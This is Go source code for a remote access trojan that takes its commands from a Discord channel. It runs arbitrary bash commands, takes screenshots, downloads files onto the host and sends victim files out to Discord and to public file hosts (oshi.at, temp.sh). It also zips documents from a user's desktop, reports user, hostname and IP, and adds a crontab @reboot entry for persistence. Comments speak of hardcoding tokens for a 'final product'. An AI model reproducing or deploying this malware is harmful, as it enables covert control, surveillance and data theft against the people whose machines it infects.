package main

import (
	"archive/zip"
	"bufio" //TODO Delete in final product as API keys will be hardcoded, not loaded from .env as in my example
	"bytes"
	"fmt"
	"image/png"
	"io"
	"io/fs"
	"log" // TODO Delete later
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
)

const (
	tmpDir = "/tmp/"
)

// Global variable
var myChannelId string
var myGuildId string // Later removed as it will be hardcoded into function

func loadEnvFile(filePath string) (map[string]string, error) {
	envVars := make(map[string]string)

	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		envVars[parts[0]] = parts[1]
	}

	return envVars, nil
}
func commandAndControl(session *discordgo.Session, message *discordgo.MessageCreate) {
	if message.ChannelID != myChannelId || message.Author.ID == session.State.User.ID {
		return
	}
	session.MessageReactionAdd(message.ChannelID, message.ID, "🕐") // Command processing
	flag := 0

	//Run command
	if strings.HasPrefix(message.Content, "🏃‍♂️") {
		var cmd *exec.Cmd = exec.Command("/bin/bash", "-c", message.Content[14:len(message.Content)])
		out, err := cmd.CombinedOutput()
		if err != nil {
			// Append error to next line
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		// Message is too long, save as file
		if len(out) > 2000-13 {
			f, _ := os.CreateTemp(tmpDir, "*.txt")
			f.Write(out)
			fileName := f.Name()
			f.Close()
			f, _ = os.Open(fileName)
			defer f.Close()
			defer os.Remove(f.Name())
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			session.ChannelMessageSendComplex(message.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: message.Reference()})
		} else {
			var resp strings.Builder
			resp.WriteString("```bash\n")
			resp.WriteString(string(out) + "\n")
			resp.WriteString("```")
			session.ChannelMessageSendReply(message.ChannelID, resp.String(), message.Reference())
		}
		flag = 1
	} else if message.Content == "📸" {
		n := screenshot.NumActiveDisplays()
		if n == 0 {
			session.ChannelMessageSendReply(message.ChannelID, "No active Displays", message.Reference())
		}
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)

			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
				goto end
			}
			var buf bytes.Buffer
			err = png.Encode(&buf, img)
			if err != nil {
				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
				goto end
			}
			discordFile := &discordgo.File{
				Name:   "Screenshot.png",
				Reader: bytes.NewReader(buf.Bytes()),
			}
			_, err = session.ChannelMessageSendComplex(message.ChannelID, &discordgo.MessageSend{
				Files: []*discordgo.File{discordFile},
			})
			if err != nil {
				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
				goto end
			}
		}
		flag = 1
	} else if strings.HasPrefix(message.Content, "👇") {
		fileName := message.Content[5:len(message.Content)]
		f, _ := os.Open(fileName)
		fi, _ := f.Stat()
		defer f.Close()
		if fi.Size() < 8388608 { // 8MB file limit
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			session.ChannelMessageSendComplex(message.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: message.Reference()})
			flag = 1
		} else {
			session.ChannelMessageSendReply(message.ChannelID, "File is bigger than 8MB 😔", message.Reference())
		}
	} else if strings.HasPrefix(message.Content, "☝️") {
		path := message.Content[7:len(message.Content)]
		if len(message.Attachments) > 0 {
			out, err := os.Create(path)
			if err != nil {
				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
				goto end
			}
			defer out.Close()
			resp, err := http.Get(message.Attachments[0].URL)
			if err != nil {
				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
				goto end
			}
			defer resp.Body.Close()
			io.Copy(out, resp.Body)
			session.ChannelMessageSendReply(message.ChannelID, "Uploaded file to "+path, message.Reference())
		}
		flag = 1
	} else if strings.HasPrefix(message.Content, "👉") {
		filePath := message.Content[5:len(message.Content)]
		f, _ := os.Open(filePath)
		defer f.Close()

		var requestBody bytes.Buffer
		writer := multipart.NewWriter(&requestBody)

		// Create form file field
		filePart, err := writer.CreateFormFile("file[]", f.Name()) // field name and filename
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		if _, err := io.Copy(filePart, f); err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}

		// Aditional info
		writer.WriteField("expire", "1440")
		writer.WriteField("autodestroy", "0")
		writer.WriteField("randomizefn", "1")
		writer.WriteField("shorturl", "0")

		// Close the writer to finalize the multipart data
		writer.Close()
		// Send the POST request
		response, err := http.Post("https://oshi.at/", writer.FormDataContentType(), &requestBody)
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		defer response.Body.Close()
		responseBody, err := io.ReadAll(response.Body)
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		session.ChannelMessageSendReply(message.ChannelID, string(responseBody), message.Reference())

		flag = 1
	} else if strings.HasPrefix(message.Content, "👈") {
		filePath := message.Content[5:len(message.Content)]
		f, err := os.Open(filePath)

		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		defer f.Close()

		// Create a buffer to hold the multipart form data
		var requestBody bytes.Buffer
		writer := multipart.NewWriter(&requestBody)

		// Create a form file field
		part, err := writer.CreateFormFile("file", f.Name())
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}

		// Copy the file content into the form file field
		_, err = io.Copy(part, f)
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}

		// Close the writer to set the terminating boundary
		err = writer.Close()
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		// Make the POST request
		resp, err := http.Post("http://temp.sh/upload", writer.FormDataContentType(), &requestBody)
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		defer resp.Body.Close()

		// Read and print the response
		responseBody, err := io.ReadAll(resp.Body)
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		session.ChannelMessageSendReply(message.ChannelID, string(responseBody), message.Reference())

		flag = 1
	} else if message.Content == "🔥" {
		zipFile, err := os.Create("files.zip")
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		defer zipFile.Close()

		filepaths := []string{}

		zipWriter := zip.NewWriter(zipFile)
		defer zipWriter.Close()

		err = filepath.Walk("/mnt/c/Users/julko/Desktop/Škola/", func(path string, fileinfo fs.FileInfo, err error) error {
			var validExtensions = []string{".csv", ".doc", ".iso", ".jpg", ".odp", ".ods", ".odt", ".pdf", ".ppt", ".rar", ".sql", ".tar", ".xls", ".zip"}

			if err != nil || fileinfo == nil || fileinfo.IsDir() {
				return nil
			}
			fileExtension := strings.ToLower(filepath.Ext(fileinfo.Name()))
			if contains(&validExtensions, fileExtension) {
				filepaths = append(filepaths, path)
			}
			return nil

		})
		if err != nil {
			session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
			goto end
		}
		for _, file := range filepaths {
			err := addFileToZip(zipWriter, file)
			if err != nil {
				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
				goto end
			}
		}
		session.ChannelMessageSendReply(message.ChannelID, "Zip created successfully", message.Reference())

		flag = 1
	} else if message.Content == "💀" {
		flag = 2
	}

end:
	session.MessageReactionRemove(message.ChannelID, message.ID, "🕐", "@me")
	if flag > 0 {
		session.MessageReactionAdd(message.ChannelID, message.ID, "✅")
		if flag > 1 {
			session.Close()
			os.Exit(0)
		}
	}
}
func addFileToZip(zipWriter *zip.Writer, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("error opening file %s: %v", filePath, err)
	}
	defer file.Close()

	zipFileWriter, err := zipWriter.Create(filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("error creating ZIP entry for file %s: %v", filePath, err)
	}

	_, err = io.Copy(zipFileWriter, file)
	if err != nil {
		return fmt.Errorf("error copying file contents to ZIP: %v", err)
	}

	return nil
}
func contains(slice *[]string, str string) bool {
	for _, item := range *slice {
		if item == str {
			return true
		}
	}
	return false
}
func discordBot(token string) {
	bot, err := discordgo.New(fmt.Sprint("Bot ", token))
	if err != nil {
		log.Fatal(err)
	}
	// Set intents only for messages
	bot.Identify.Intents = discordgo.IntentsAllWithoutPrivileged

	// Start websocket connection
	err = bot.Open()
	if err != nil {
		log.Fatal(err)
	}

	// Create message handler
	bot.AddHandler(commandAndControl)

	sendInitialData(bot)

	stop := make(chan bool)
	<-stop
}
func sendInitialData(bot *discordgo.Session) {
	// Necessary data to find channel
	OS := runtime.GOOS
	currentUser, _ := user.Current()
	sessionId := fmt.Sprintf("sess-%s-%s", OS, currentUser.Username)
	// Discord string convention
	sessionId = strings.ToLower(strings.ReplaceAll(sessionId, "\\", "-"))

	channels, err := bot.GuildChannels(myGuildId)
	if err != nil {
		fmt.Println("error fetching channels,", err)
		return
	}

	// Search for the channel by name
	var found bool = false
	for _, channel := range channels {
		if channel.Name == sessionId {
			myChannelId = channel.ID
			found = true
			break
		}
	}
	if found {
		// Send message about being active
		bot.ChannelMessageSend(myChannelId, "Online")
	} else {
		// Create new channel
		c, _ := bot.GuildChannelCreate(myGuildId, sessionId, 0) // Guild ID will be hardcoded
		myChannelId = c.ID
		// Get data about user
		hostname, _ := os.Hostname()
		cwd, _ := os.Getwd()
		conn, _ := net.Dial("udp", "8.8.8.8:80")
		defer conn.Close()
		// I dont know for what was local address, like global can be a lot more usefull but i guess it was useful for something
		localAddr := conn.LocalAddr().(*net.UDPAddr)
		// Send first message with basic info (and pin it)
		firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
		m, _ := bot.ChannelMessageSend(myChannelId, firstMsg)
		bot.ChannelMessagePin(myChannelId, m.ID)

		//Persistance
		crontabPersistance()
	}
}
func crontabPersistance() {
	cwd, _ := os.Getwd()
	cronJob := "@reboot " + cwd + os.Args[0][1:]

	// Get current crontab
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil {
		return
	}

	// Add the new cron job to the existing jobs
	newCron := string(output) + "\n" + cronJob + "\n"

	// Set the new crontab
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	err = cmd.Run()
	if err != nil {
		return
	}
}

func main() {
	//Load Enviromental variables in which is DISCORD_TOKEN and GUILD_ID, for testing you need to create your own toknes and get id
	//In real life scenario tokens are build into program, sometimes encoded in program or retrieved dynamicly using webrequests or any other way
	envVars, err := loadEnvFile(".env")
	if err != nil {
		log.Fatal(err)
	}
	var TOKEN = envVars["DISCORD_TOKEN"]
	myGuildId = envVars["GUILD_ID"]

	discordBot(TOKEN)
}
